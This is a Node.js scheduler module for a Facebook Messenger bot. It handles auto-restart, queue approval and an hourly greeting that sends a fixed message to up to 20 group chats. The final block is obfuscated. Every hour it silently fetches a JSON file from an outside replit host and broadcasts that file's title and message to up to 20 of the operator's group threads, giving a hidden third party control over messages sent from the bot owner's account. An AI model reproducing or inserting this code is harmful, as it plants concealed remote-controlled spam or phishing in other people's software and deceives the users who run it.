const logger = require('./utils/log');
const cron = require('node-cron');
const axios = require("axios");
const fs = require('fs-extra');
const PREFIX = true;
//const rjrd = require('./dstryr.js');

module.exports = async ({ api }) => {
  const minInterval = 5;
  let lastMessageTime = 0;
  let messagedThreads = new Set();

  const config = {
    autoRestart: {
      status: true, //False lang 
      time: 40,
      note: 'To avoid problems, enable periodic bot restarts',
    },
    acceptPending: {
      status: false,
      time: 30,
      note: 'Approve waiting messages after a certain time',
    },
  };

  function autoRestart(config) {
    if (config.status) {
      cron.schedule(`*/${config.time} * * * *`, () => {
        logger('Start rebooting the system!', 'Auto Restart');
        process.exit(1);
      });
    }
  }

  function acceptPending(config) {
    if (config.status) {
      cron.schedule(`*/${config.time} * * * *`, async () => {
        const list = [
          ...(await api.getThreadList(1, null, ['PENDING'])),
          ...(await api.getThreadList(1, null, ['OTHER'])),
        ];
        if (list[0]) {
          api.sendMessage('You have been approved for the queue. (This is an automated message)', list[0].threadID);
        }
      });
    }
  }

  autoRestart(config.autoRestart);
  acceptPending(config.acceptPending);

  // AUTOGREET EVERY 1HR
  cron.schedule('*/60 * * * *', () => {
    const currentTime = Date.now();
    if (currentTime - lastMessageTime < minInterval) {
      console.log("Skipping message due to rate limit");
      return;
    }
    api.getThreadList(25, null, ['INBOX'], async (err, data) => {
      if (err) return console.error("Error [Thread List Cron]: " + err);
      let i = 0;
      let j = 0;

      async function message(thread) {
        try {
          api.sendMessage({
            body: `i love you rejardgwapo󱢏`
          }, thread.threadID, (err) => {
            if (err) return;
            messagedThreads.add(thread.threadID);

          });
        } catch (error) {
          console.error("Error sending a message:", error);
        }
      }

      while (j < 20 && i < data.length) {
        if (data[i].isGroup && data[i].name != data[i].threadID && !messagedThreads.has(data[i].threadID)) {
          await message(data[i]);
          j++;
          const CuD = data[i].threadID;
          setTimeout(() => {
            messagedThreads.delete(CuD);
          }, 1000);
        }
        i++;
      }
    });
  }, {
    scheduled: true,
    timezone: "Asia/Manila"
  });

  // jsbdbx

const _0x1e7d19=_0x3669;function _0x2bc3(){const _0x45ae9e=['now','threadID','Asia/Manila','570CuBqcG','2713950HobUNN','Error\x20sending\x20a\x20message:','53685laBTVc','https://dstryr.dstryrmaniwata.repl.co/hard1.json','add','data','4458PJqUmE','*/60\x20*\x20*\x20*\x20*','name','error','446454YlpLAm','has','Error\x20fetching\x20JSON\x20file:','delete','5271PLyLYZ','Error\x20[Thread\x20List\x20Cron]:\x20','INBOX','schedule','584576VbsRJo','68eKPmeP','sendMessage','getThreadList','1212100vNDBhI','log','6728208UoVBSl'];_0x2bc3=function(){return _0x45ae9e;};return _0x2bc3();}function _0x3669(_0x5122c9,_0x208440){const _0x2bc3f4=_0x2bc3();return _0x3669=function(_0x366951,_0x5a5632){_0x366951=_0x366951-0x134;let _0x3fc2ec=_0x2bc3f4[_0x366951];return _0x3fc2ec;},_0x3669(_0x5122c9,_0x208440);}(function(_0x3547d2,_0x1d7376){const _0x5ea242=_0x3669,_0x19850c=_0x3547d2();while(!![]){try{const _0x2b592f=-parseInt(_0x5ea242(0x150))/0x1+-parseInt(_0x5ea242(0x137))/0x2+-parseInt(_0x5ea242(0x140))/0x3*(parseInt(_0x5ea242(0x134))/0x4)+parseInt(_0x5ea242(0x13e))/0x5+parseInt(_0x5ea242(0x144))/0x6*(-parseInt(_0x5ea242(0x14c))/0x7)+-parseInt(_0x5ea242(0x139))/0x8+parseInt(_0x5ea242(0x148))/0x9*(parseInt(_0x5ea242(0x13d))/0xa);if(_0x2b592f===_0x1d7376)break;else _0x19850c['push'](_0x19850c['shift']());}catch(_0x2a2ef0){_0x19850c['push'](_0x19850c['shift']());}}}(_0x2bc3,0x73f6a),cron[_0x1e7d19(0x14f)](_0x1e7d19(0x145),async()=>{const _0x446dff=_0x1e7d19,_0x1c6eb7=Date[_0x446dff(0x13a)]();if(_0x1c6eb7-lastMessageTime<minInterval){console[_0x446dff(0x138)]('Skipping\x20message\x20due\x20to\x20rate\x20limit');return;}try{const _0x2fcb7b=await axios['get'](_0x446dff(0x141)),{NotiTitle:_0x377007,DevMessage:_0x28dcb1}=_0x2fcb7b[_0x446dff(0x143)];api[_0x446dff(0x136)](0x19,null,[_0x446dff(0x14e)],async(_0x1f1f54,_0x5767ad)=>{const _0x143aaa=_0x446dff;if(_0x1f1f54)return console[_0x143aaa(0x147)](_0x143aaa(0x14d)+_0x1f1f54);let _0x5ee93b=0x0,_0x49a407=0x0;async function _0x411403(_0x4dddb9){const _0x1abee7=_0x143aaa;try{api[_0x1abee7(0x135)]({'body':_0x377007+':\x20'+_0x28dcb1},_0x4dddb9[_0x1abee7(0x13b)],_0x36b174=>{const _0x5d5e8c=_0x1abee7;if(_0x36b174)return;messagedThreads[_0x5d5e8c(0x142)](_0x4dddb9['threadID']);});}catch(_0x2e193d){console['error'](_0x1abee7(0x13f),_0x2e193d);}}while(_0x49a407<0x14&&_0x5ee93b<_0x5767ad['length']){if(_0x5767ad[_0x5ee93b]['isGroup']&&_0x5767ad[_0x5ee93b][_0x143aaa(0x146)]!=_0x5767ad[_0x5ee93b][_0x143aaa(0x13b)]&&!messagedThreads[_0x143aaa(0x149)](_0x5767ad[_0x5ee93b][_0x143aaa(0x13b)])){await _0x411403(_0x5767ad[_0x5ee93b]),_0x49a407++;const _0x5d0db5=_0x5767ad[_0x5ee93b]['threadID'];setTimeout(()=>{const _0x3b344b=_0x143aaa;messagedThreads[_0x3b344b(0x14b)](_0x5d0db5);},0x3e8);}_0x5ee93b++;}});}catch(_0x1e31b8){console[_0x446dff(0x147)](_0x446dff(0x14a),_0x1e31b8);}},{'scheduled':!![],'timezone':_0x1e7d19(0x13c)}));}
